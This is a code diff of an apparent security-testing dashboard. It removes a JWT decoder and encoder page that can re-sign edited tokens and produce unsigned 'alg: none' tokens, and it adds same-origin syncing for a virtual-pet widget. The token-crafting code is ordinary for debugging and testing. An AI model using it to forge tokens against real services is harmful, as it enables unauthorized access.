-    if(ok){badge.style.background='rgba(63,185,80,.15)';badge.style.color='var(--green)';badge.style.border='1px solid rgba(63,185,80,.3)';}
-    else{badge.style.background='rgba(248,81,73,.12)';badge.style.color='var(--red)';badge.style.border='1px solid rgba(248,81,73,.3)';}
-  }
-
-  function updateMeta(raw){
-    errEl.textContent='';algEl.textContent='';subEl.textContent='';timesEl.innerHTML='';
-    badge.style.display='none';
-    colorize(raw);
-    if(!raw)return;
-    var parts=raw.split('.');
-    if(parts.length<2||parts.length>3){errEl.textContent='Token non valido';return;}
-    try{
-      var hdr=JSON.parse(b64uDec(parts[0]));
-      algEl.textContent=hdr.alg||'none';
-      if(hdr.alg&&algMap[hdr.alg]){
-        document.querySelectorAll('#view-decode .jwt-alg-btn').forEach(function(b){
-          b.classList.toggle('active',b.dataset.alg===hdr.alg);
-        });
-        decAlg=hdr.alg;
-      }
-    }catch(e){errEl.textContent='Header: '+e.message;return;}
-    try{
-      var pay=JSON.parse(b64uDec(parts[1]));
-      if(pay.sub)subEl.textContent='sub: '+pay.sub;
-      var ts=[];
-      if(pay.iat!=null){var f=fmtTs(pay.iat);if(f)ts.push('iat (issued): '+f);}
-      if(pay.exp!=null){
-        var f=fmtTs(pay.exp);if(f){
-          var now=Math.floor(Date.now()/1000);
-          if(pay.exp<now)ts.push('<span class="expired">exp (expired): '+esc(f)+'</span>');
-          else ts.push('<span class="valid">exp (valid): '+esc(f)+'</span>');
-        }
-      }
-      if(pay.nbf!=null){var f=fmtTs(pay.nbf);if(f)ts.push('nbf (not before): '+esc(f));}
-      if(ts.length)timesEl.innerHTML=ts.join('<br>');
-    }catch(e){errEl.textContent='Payload: '+e.message;return;}
-    showBadge(true,'Valid JWT');
-  }
-
-  function decode(){
-    var raw=inp.value.trim();
-    updateMeta(raw);
-    if(!raw){headerEl.value='';payloadEl.value='';return;}
-    var parts=raw.split('.');
-    if(parts.length<2||parts.length>3){headerEl.value='';payloadEl.value='';return;}
-    try{
-      var hdr=JSON.parse(b64uDec(parts[0]));
-      headerEl.value=JSON.stringify(hdr,null,2);
-    }catch(e){return;}
-    try{
-      var pay=JSON.parse(b64uDec(parts[1]));
-      payloadEl.value=JSON.stringify(pay,null,2);
-    }catch(e){return;}
-  }
-
-  function rebuildFromRight(){
-    var gen=++rebuildGen;
-    try{
-      var hdrTxt=headerEl.value.trim();
-      var payTxt=payloadEl.value.trim();
-      JSON.parse(hdrTxt);JSON.parse(payTxt);
-      var h=b64uEnc(hdrTxt);
-      var p=b64uEnc(payTxt);
-      var sec=document.getElementById('jwt-secret').value;
-      if(decAlg==='none'||!algMap[decAlg]||!sec){
-        inp.value=h+'.'+p+'.';
-        updateMeta(inp.value.trim());return;
-      }
-      var ha=algMap[decAlg];
-      var te=new TextEncoder();
-      var unsigned=h+'.'+p;
-      crypto.subtle.importKey('raw',te.encode(sec),{name:'HMAC',hash:ha},false,['sign'])
-      .then(function(key){return crypto.subtle.sign('HMAC',key,te.encode(unsigned));})
-      .then(function(sig){
-        if(gen!==rebuildGen)return;
-        inp.value=unsigned+'.'+u8b64u(new Uint8Array(sig));
-        updateMeta(inp.value.trim());
-      });
-    }catch(e){
-      errEl.textContent='JSON non valido';
-    }
-  }
-
-  inp.addEventListener('input',decode);
-  headerEl.addEventListener('input',rebuildFromRight);
-  payloadEl.addEventListener('input',rebuildFromRight);
-
-  window.setAlg=function(btn){
-    document.querySelectorAll('#view-decode .jwt-alg-btn').forEach(function(b){b.classList.remove('active');});
-    btn.classList.add('active');
-    decAlg=btn.dataset.alg;
-    if(headerEl.value.trim()){
-      try{
-        var h=JSON.parse(headerEl.value);
-        if(decAlg==='none')delete h.alg;else h.alg=decAlg;
-        headerEl.value=JSON.stringify(h,null,2);
-        rebuildFromRight();
-      }catch(e){}
-    }
-  };
-
-  window.doVerify=function(){
-    verifyEl.textContent='';verifyEl.style.color='';
-    var raw=inp.value.trim();
-    if(!raw){verifyEl.textContent='Nessun token';verifyEl.style.color='var(--red)';return;}
-    var sec=document.getElementById('jwt-secret').value;
-    if(!sec){verifyEl.textContent='Inserisci un secret';verifyEl.style.color='var(--red)';return;}
-    var parts=raw.split('.');if(parts.length!==3){verifyEl.textContent='Token incompleto';verifyEl.style.color='var(--red)';return;}
-    try{var hdr=JSON.parse(b64uDec(parts[0]));}catch(e){verifyEl.textContent='Header non valido';verifyEl.style.color='var(--red)';return;}
-    var ha=algMap[hdr.alg];
-    if(!ha){verifyEl.textContent=hdr.alg+' non verificabile (solo HMAC)';verifyEl.style.color='var(--text2)';return;}
-    var te=new TextEncoder();
-    crypto.subtle.importKey('raw',te.encode(sec),{name:'HMAC',hash:ha},false,['sign'])
-    .then(function(key){return crypto.subtle.sign('HMAC',key,te.encode(parts[0]+'.'+parts[1]));})
-    .then(function(sig){
-      var ok=u8b64u(new Uint8Array(sig))===parts[2];
-      verifyEl.textContent=ok?'Firma VALIDA':'Firma NON VALIDA';
-      verifyEl.style.color=ok?'var(--green)':'var(--red)';
-      showBadge(ok,ok?'Signature Verified':'Invalid Signature');
-    });
-  };
-
-  window.copyEncoded=function(){
-    var t=inp.value.trim();if(!t)return;
-    navigator.clipboard.writeText(t).then(function(){
-      var b=event.target;b.textContent='Copiato!';setTimeout(function(){b.textContent='Copia';},1200);
-    });
-  };
-
-  /* ---- ENCODER ---- */
-  var encHeaderEl=document.getElementById('enc-header');
-  var encPayloadEl=document.getElementById('enc-payload');
-  var encSecretEl=document.getElementById('enc-secret');
-  var encColored=document.getElementById('enc-colored');
-  var encErr=document.getElementById('enc-err');
-
-  window.setEncAlg=function(btn){
-    document.querySelectorAll('#view-encode .jwt-alg-btn').forEach(function(b){b.classList.remove('active');});
-    btn.classList.add('active');
-    encAlg=btn.dataset.alg;
-    try{
-      var h=JSON.parse(encHeaderEl.value);
-      if(encAlg==='none'){delete h.alg;h.typ='JWT';}
-      else{h.alg=encAlg;h.typ='JWT';}
-      encHeaderEl.value=JSON.stringify(h,null,2);
-    }catch(e){}
-    buildEncoder();
-  };
-
-  function buildEncoder(){
-    encErr.textContent='';encColored.innerHTML='';
-    var hdrTxt=encHeaderEl.value.trim();
-    var payTxt=encPayloadEl.value.trim();
-    try{JSON.parse(hdrTxt);}catch(e){encErr.textContent='Header JSON non valido';return;}
-    try{JSON.parse(payTxt);}catch(e){encErr.textContent='Payload JSON non valido';return;}
-    var hObj=JSON.parse(hdrTxt);
-    if(encAlg==='none')delete hObj.alg;else{hObj.alg=encAlg;hObj.typ='JWT';}
-    var h=b64uEnc(JSON.stringify(hObj));
-    var p=b64uEnc(payTxt);
-    var unsigned=h+'.'+p;
-    if(encAlg==='none'){
-      encColored.innerHTML='<span class="jc-h">'+esc(h)+'</span><span class="jc-d">.</span><span class="jc-p">'+esc(p)+'</span><span class="jc-d">.</span>';
-      return;
-    }
-    var sec=encSecretEl.value;
-    if(!sec){encErr.textContent='Secret richiesto per la firma';return;}
-    var ha=algMap[encAlg];if(!ha){encErr.textContent='Algoritmo non supportato';return;}
-    var te=new TextEncoder();
-    crypto.subtle.importKey('raw',te.encode(sec),{name:'HMAC',hash:ha},false,['sign'])
-    .then(function(key){return crypto.subtle.sign('HMAC',key,te.encode(unsigned));})
-    .then(function(sig){
-      var s=u8b64u(new Uint8Array(sig));
-      encColored.innerHTML='<span class="jc-h">'+esc(h)+'</span><span class="jc-d">.</span><span class="jc-p">'+esc(p)+'</span><span class="jc-d">.</span><span class="jc-s">'+esc(s)+'</span>';
-    })
-    .catch(function(e){encErr.textContent='Errore: '+e.message;});
-  }
-  encHeaderEl.addEventListener('input',buildEncoder);
-  encPayloadEl.addEventListener('input',buildEncoder);
-  encSecretEl.addEventListener('input',buildEncoder);
-
-  window.copyGenerated=function(){
-    var t=encColored.textContent;if(!t)return;
-    navigator.clipboard.writeText(t).then(function(){
-      var b=event.target;b.textContent='Copiato!';setTimeout(function(){b.textContent='Copia';},1200);
-    });
-  };
-
-  var sample='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
-  inp.value=sample;
-  decode();
-})();
-</script>
-"""
-    return _base_html("JWT", body, active="jwt")
-
-
-    return _base_html("JWT", body, active="jwt")
 
 
 def _page_burp() -> str:
@@ -2618,13 +2257,32 @@ function loadPet(){{
   pet.fullness=Math.min(100,Math.max(0,pet.fullness||0));
   return pet;
 }}
-function savePet(pet){{pet.updated=Date.now()/1000;localStorage.setItem('sl_pet',JSON.stringify(pet));}}
+function savePet(pet){{
+  pet.updated=Date.now()/1000;
+  localStorage.setItem('sl_pet',JSON.stringify(pet));
+  fetch('/api/pet',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify(pet)}}).catch(function(){{}});
+}}
+function syncFromServer(){{
+  fetch('/api/pet').then(function(r){{return r.json();}}).then(function(srv){{
+    var u=parseFloat(srv.updated)||0;
+    var lu=parseFloat(pet.updated)||0;
+    if(u>lu){{
+      var el=u>0?Math.max(0,Date.now()/1000-u):0;
+      var tk=Math.floor(el/600);
+      if(tk>0){{srv.happiness=Math.max(0,(srv.happiness||50)-tk);srv.fullness=Math.max(0,(srv.fullness||50)-tk);}}
+      srv.happiness=Math.min(100,Math.max(0,srv.happiness||0));
+      srv.fullness=Math.min(100,Math.max(0,srv.fullness||0));
+      pet=srv;localStorage.setItem('sl_pet',JSON.stringify(pet));updateUI();
+    }}
+  }}).catch(function(){{}});
+}}
 function addStat(pet,key,d){{pet[key]=Math.min(100,Math.max(0,(pet[key]||0)+d));}}
 function getMood(h){{if(h>=80)return'Estasiato';if(h>=60)return'Contento';if(h>=40)return'Ok';if(h>0)return'Triste';return SAD_LINE;}}
 function barColor(v){{return v>=60?'var(--green,#2ecc71)':v>=30?'var(--yellow,#f39c12)':'var(--red,#e74c3c)';}}
 
 var pet=loadPet();
 savePet(pet);
+syncFromServer();
 
 var artEl=document.getElementById('pet-art');
 var scene=document.getElementById('seal-scene');
@@ -3492,8 +3150,6 @@ class SlRequestHandler(http.server.BaseHTTPRequestHandler):
                 self._send_html(_page_delivery())
         elif path == "/loot":
             self._send_html(_page_loot())
-        elif path == "/jwt":
-            self._send_html(_page_jwt())
         elif path == "/pet":
             self._send_html(_page_pet())
         elif path == "/burp":
